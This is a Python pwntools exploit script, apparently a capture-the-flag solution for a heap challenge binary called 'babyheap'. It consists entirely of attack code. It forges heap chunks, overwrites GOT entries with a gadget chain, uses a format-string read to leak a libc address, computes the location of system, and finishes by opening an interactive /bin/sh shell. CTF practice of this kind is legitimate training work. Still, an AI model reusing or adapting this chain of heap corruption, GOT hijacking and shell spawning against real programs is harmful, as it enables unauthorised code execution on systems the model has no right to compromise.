from pwn import *

context.clear(arch = 'amd64')

file = "./babyheap"

bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


conn = process(file)

def new(size, content, name):
    conn.sendline("1")
    conn.recvuntil("Size :")
    conn.sendline(str(size))
    conn.recvuntil("Content:")
    conn.send(content)
    conn.recvuntil("Name:")
    conn.send(name)
    conn.recvuntil("choice:")

def exit(str):
    conn.sendline("4")
    conn.recvuntil("Y/n)")
    conn.send(str)
    conn.recvuntil("choice:")

def delete():
    conn.sendline("2")
    conn.recvuntil("choice:")

def edit(content):
    conn.sendline("3")
    conn.recvuntil("Content:")
    conn.send(content)
    conn.recvuntil("choice:")

payload = "n"*(0x1000 - 0x20)

fake_chunk = p64(0) \
             + p64(0x50) \
             + "d"*16

payload += fake_chunk

exit(payload)

fake_chunk = p64(0) \
             + p64(0x21)

new(0x80, fake_chunk, "a"*8)

delete()

fake_chunk = "q"*16 \
             + p64(0) \
             + p64(0x33) \
             + p64(0x1000) \
             + p64(0xcafecafe) \
             + p64(bin.got['_exit']) # Gonna overwrite from this

new(0x43, fake_chunk, "blah")

# Gadgets
ret_addr = 0x0000000000400711

payload = p64(ret_addr) \
          + p64(bin.symbols['__read_chk'] + 6) \
          + p64(bin.symbols['puts'] + 6) \
          + p64(ret_addr) \
          + p64(bin.symbols['printf'] + 6) \
          + p64(ret_addr) \
          + p64(bin.symbols['read'] + 6) \
          + p64(ret_addr) \
          + p64(ret_addr) \
          + p64(ret_addr) \
          + p64(ret_addr) \
          + p64(bin.symbols['printf'])

edit(payload)

fmtstr = "%9$s----" + p64(bin.got['free'])

conn.send(fmtstr)

free_addr = u64(conn.recvn(6) + "\x00\x00")

system_addr = libc.symbols['system'] - libc.symbols['free'] + free_addr

payload = payload[:len(payload)-8]
payload += p64(system_addr)

conn.recvuntil("choice:")
conn.send("aaa") # atoi will get 3
conn.recvuntil("Content:")
conn.send(payload)

conn.sendline("/bin/sh")

conn.interactive()
